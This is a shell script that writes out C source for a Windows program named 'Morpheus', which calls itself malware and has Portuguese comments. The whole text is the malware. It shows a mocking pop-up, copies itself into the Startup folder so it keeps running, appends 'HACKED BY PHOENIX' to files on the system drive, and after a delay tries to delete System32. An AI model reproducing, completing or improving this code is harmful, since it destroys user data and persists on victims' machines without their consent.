echo '#include <stdio.h>' > morpheus.c
echo '#include <stdlib.h>' >> morpheus.c
echo '#include <string.h>' >> morpheus.c
echo '#include <windows.h>' >> morpheus.c
echo '#include <time.h>' >> morpheus.c
echo '' >> morpheus.c
echo '// Função para criar um arquivo de alerta' >> morpheus.c
echo 'void create_alert_file() {' >> morpheus.c
echo '    FILE *file;' >> morpheus.c
echo '    char desktop[MAX_PATH];' >> morpheus.c
echo '    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop);' >> morpheus.c
echo '    strcat(desktop, "\\\\ALERTA_MORPHEUS.txt");' >> morpheus.c
echo '' >> morpheus.c
echo '    file = fopen(desktop, "w");' >> morpheus.c
echo '    if (file != NULL) {' >> morpheus.c
echo '        fprintf(file, "Seu computador foi infectado pelo malware Morpheus!\\nHACKED BY PHOENIX");' >> morpheus.c
echo '        fclose(file);' >> morpheus.c
echo '        printf("Arquivo de alerta criado: %s\\n", desktop);' >> morpheus.c
echo '    } else {' >> morpheus.c
echo '        printf("Erro ao criar arquivo de alerta.\\n");' >> morpheus.c
echo '    }' >> morpheus.c
echo '}' >> morpheus.c
echo '' >> morpheus.c
echo '// Função para mostrar mensagem pop-up' >> morpheus.c
echo 'void show_popup() {' >> morpheus.c
echo '    MessageBox(NULL, "Seu computador foi infectado pelo malware Morpheus! Parabéns por ser tão idiota!", "Alerta de Infecção", MB_OK);' >> morpheus.c
echo '}' >> morpheus.c
echo '' >> morpheus.c
echo '// Função para garantir execução automática no Windows' >> morpheus.c
echo 'void ensure_auto_execution(char *path) {' >> morpheus.c
echo '    char startup[MAX_PATH];' >> morpheus.c
echo '    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startup);' >> morpheus.c
echo '    strcat(startup, "\\\\Morpheus.exe");' >> morpheus.c
echo '' >> morpheus.c
echo '    if (CopyFile(path, startup, FALSE)) {' >> morpheus.c
echo '        printf("Configuração de execução automática adicionada.\\n");' >> morpheus.c
echo '    } else {' >> morpheus.c
echo '        printf("Erro ao configurar execução automática.\\n");' >> morpheus.c
echo '    }' >> morpheus.c
echo '}' >> morpheus.c
echo '' >> morpheus.c
echo '// Função para infectar e corromper arquivos em um diretório' >> morpheus.c
echo 'void infect_and_corrupt_files(char *directory) {' >> morpheus.c
echo '    WIN32_FIND_DATA findFileData;' >> morpheus.c
echo '    HANDLE hFind = FindFirstFile(strcat(directory, "\\\\*"), &findFileData);' >> morpheus.c
echo '' >> morpheus.c
echo '    if (hFind == INVALID_HANDLE_VALUE) {' >> morpheus.c
echo '        printf("Erro ao abrir diretório: %s\\n", directory);' >> morpheus.c
echo '        return;' >> morpheus.c
echo '    }' >> morpheus.c
echo '' >> morpheus.c
echo '    do {' >> morpheus.c
echo '        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {' >> morpheus.c
echo '            // Ignora diretórios "." e ".."' >> morpheus.c
echo '            if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {' >> morpheus.c
echo '                continue;' >> morpheus.c
echo '            }' >> morpheus.c
echo '        } else {' >> morpheus.c
echo '            char filePath[MAX_PATH];' >> morpheus.c
echo '            sprintf(filePath, "%s\\\\%s", directory, findFileData.cFileName);' >> morpheus.c
echo '            FILE *file = fopen(filePath, "a");' >> morpheus.c
echo '            if (file != NULL) {' >> morpheus.c
echo '                fprintf(file, "\\n# Arquivo infectado e corrompido por Morpheus\\nHACKED BY PHOENIX\\n");' >> morpheus.c
echo '                fclose(file);' >> morpheus.c
echo '                printf("Corrompido: %s\\n", filePath);' >> morpheus.c
echo '            } else {' >> morpheus.c
echo '                printf("Erro ao corromper: %s\\n", filePath);' >> morpheus.c
echo '            }' >> morpheus.c
echo '        }' >> morpheus.c
echo '    } while (FindNextFile(hFind, &findFileData) != 0);' >> morpheus.c
echo '' >> morpheus.c
echo '    FindClose(hFind);' >> morpheus.c
echo '}' >> morpheus.c
echo '' >> morpheus.c
echo '// Função para deletar System32' >> morpheus.c
echo 'void delete_system32() {' >> morpheus.c
echo '    char system32[MAX_PATH];' >> morpheus.c
echo '    SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, 0, system32);' >> morpheus.c
echo '' >> morpheus.c
echo '    if (RemoveDirectory(system32)) {' >> morpheus.c
echo '        printf("System32 deletado!\\n");' >> morpheus.c
echo '    } else {' >> morpheus.c
echo '        printf("Erro ao deletar System32.\\n");' >> morpheus.c
echo '    }' >> morpheus.c
echo '}' >> morpheus.c
echo '' >> morpheus.c
echo 'int main() {' >> morpheus.c
echo '    char path[MAX_PATH];' >> morpheus.c
echo '    GetModuleFileName(NULL, path, MAX_PATH);' >> morpheus.c
echo '' >> morpheus.c
echo '    // Criar arquivo de alerta' >> morpheus.c
echo '    create_alert_file();' >> morpheus.c
echo '' >> morpheus.c
echo '    // Mostrar mensagem pop-up' >> morpheus.c
echo '    show_popup();' >> morpheus.c
echo '' >> morpheus.c
echo '    // Garantir execução automática' >> morpheus.c
echo '    ensure_auto_execution(path);' >> morpheus.c
echo '' >> morpheus.c
echo '    // Infecta e corrompe arquivos no diretório alvo' >> morpheus.c
echo '    char directory[MAX_PATH];' >> morpheus.c
echo '    GetEnvironmentVariable("SystemDrive", directory, MAX_PATH);' >> morpheus.c
echo '    infect_and_corrupt_files(directory);' >> morpheus.c
echo '' >> morpheus.c
echo '    // Espera 5 minutos (300 segundos) antes de tentar deletar System32' >> morpheus.c
echo '    Sleep(300000);' >> morpheus.c
echo '' >> morpheus.c
echo '    // Deletar System32' >> morpheus.c
echo '    delete_system32();' >> morpheus.c
echo '' >> morpheus.c
echo '    return 0;' >> morpheus.c
echo '}' >> morpheus.c